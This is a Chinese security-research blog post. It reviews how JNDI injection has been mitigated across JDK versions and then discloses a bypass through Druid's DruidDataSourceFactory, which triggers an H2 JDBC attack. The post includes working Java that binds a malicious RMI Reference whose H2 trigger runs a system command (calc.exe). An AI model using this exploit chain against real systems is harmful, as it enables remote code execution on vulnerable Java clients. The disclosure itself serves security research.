@@ -1,0 +1,87 @@
+# JNDI jdk高版本绕过——Apache Druid
+## 前言
+> 这次发现其实来源于一个乌龙，太菜了，后面要好好总结一下JRMP，JMX等协议。
+为了防止文章过短，先把一些基础知识总结一下（已有基础者直接看最后一章）。
+## 基础概念
+### JNDI
+jndi全称是Java命名和目录接口，在我看来是一种远程的Java API。它允许客户端通过不同的服务协议去获取数据或者对象。
+目前Jndi支持的一些目录和命名服务有
+  * LDAP
+  * DNS
+  * NIS
+  * RMI
+  * CORBA等。
+## JNDI攻防史
+[这篇文章](https://paper.seebug.org/942/)已经总结的很好了，但是为了前后的连贯性，所以这里再简单说一下。
+### 通过RMI绑定远程对象
+将RMI远程对象并绑定到RMI Registry上，RMI客户端在 lookup()
+的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象。
+利用条件：
+1、RMI客户端的上下文环境允许访问远程Codebase。
+2、JDK 6u45、7u21之前（系统属性java.rmi.server.useCodebaseOnly限制远程codebase加载）
+### 通过RMI绑定Reference，加载远程的恶意Factory类
+攻击者通过RMI服务返回一个JNDI Naming
+Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类。
+利用条件：
+1、JDK 6u132, JDK 7u122, JDK 8u113 之前（系统属性
+com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase限制从远程的Codebase加载Factory类）
+### 通过LDAP绑定Reference，加载远程的恶意Factory类
+攻击者通过LDAP服务返回一个JNDI Naming
+Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类。
+利用条件：
+JDK
+8u191、7u201、6u211之前（系统属性com.sun.jndi.ldap.object.trustURLCodebase限制从远程的Codebase加载Factory类
+）
+### 当前阶段的限制绕过方式
+#### 本地的Factory类
+找到一个受害者本地CLASSPATH中的类作为恶意的Reference
+Factory工厂类，并利用这个本地的Factory类执行命令。这个Factory类必须实现 javax.naming.spi.ObjectFactory
+接口。
+当前已有的通用方式都是通过org.apache.naming.factory.BeanFactory这个存在于Tomcat依赖包中的工厂类，去反射构造代码执行。
+#### LDAP+反序列化
+利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。利用限制就是需要本地有反序列化
+Gadget。
+## Apache Druid利用链发现之路
+开篇的时候我就说到过这是个乌龙，其实是代码审计的过程中我以为能发起jndi连接（实则不行），然后jdk版本又过高，应用中没有Tomcat依赖包，且本地没有可利用的反序列化链（太惨了）。按照已有的限制绕过方式，就只能找找本地的Factory类了。把应用的依赖库拖了下来，然后打开IDEA，ctrl+H看看有哪些类实现了javax.naming.spi.ObjectFactory
+接口（IDEA yyds）。
+然后在审计到DruidDataSourceFactory 的时候，代码如下：
+有点猫腻啊，这个，别的工厂类啥都没干，你这里咋就创建了一个DataSource。
+继续跟进，发现是config函数。
+在config函数中，有设置password，url，username的操作，要是能再发起一个连接，那岂不是可以用来当作jdbc攻击的入口。
+继续往下看，看到这个根据init参数是否进行 初始化，我就知道八九不离十了。
+一直跟进，最后在createPhysicalConnection函数中发起了JDBC连接
+完整的调用链如下
+    createPhysicalConnection:1663, DruidAbstractDataSource (com.alibaba.druid.pool)
+    init:914, DruidDataSource (com.alibaba.druid.pool)
+    config:392, DruidDataSourceFactory (com.alibaba.druid.pool)
+    createDataSourceInternal:162, DruidDataSourceFactory (com.alibaba.druid.pool)
+    getObjectInstance:157, DruidDataSourceFactory (com.alibaba.druid.pool)
+    getObjectInstance:331, NamingManager (javax.naming.spi)
+结合“[Make JDBC Attacks Brilliant
+Again](https://www.youtube.com/watch?v=MJWI8YXH1lg&ab_channel=HackInTheBoxSecurityConference)”，我们可以根据客户端本地有哪些jdbc驱动去构造payload，如h2。
+服务端恶意代码如下。
+    try{
+        Registry registry = LocateRegistry.createRegistry(8883);
+        Reference ref = new Reference("javax.sql.DataSource","com.alibaba.druid.pool.DruidDataSourceFactory",null);
+        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
+        "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
+        "java.lang.Runtime.getRuntime().exec('cmd /c calc.exe')\n" +
+        "$$\n";
+        String JDBC_USER = "root";
+        String JDBC_PASSWORD = "password";
+        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
+        ref.add(new StringRefAddr("url",JDBC_URL));
+        ref.add(new StringRefAddr("username",JDBC_USER));
+        ref.add(new StringRefAddr("password",JDBC_PASSWORD));
+        ref.add(new StringRefAddr("initialSize","1"));
+        ref.add(new StringRefAddr("init","true"));
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
+        Naming.bind("rmi://localhost:8883/zlgExploit",referenceWrapper);
+    }
+    catch(Exception e){
+        e.printStackTrace();
+    }
+客户端运行即可运行指定命令
+## 总结
+这条利用链还是根据之前的绕过方式去找到的，应该很少遇的着，在客户端本地没有反序列化Gadget，且不是基于tomcat的应用的情况下用的着，希望对大家能有点帮助。
+## 参考
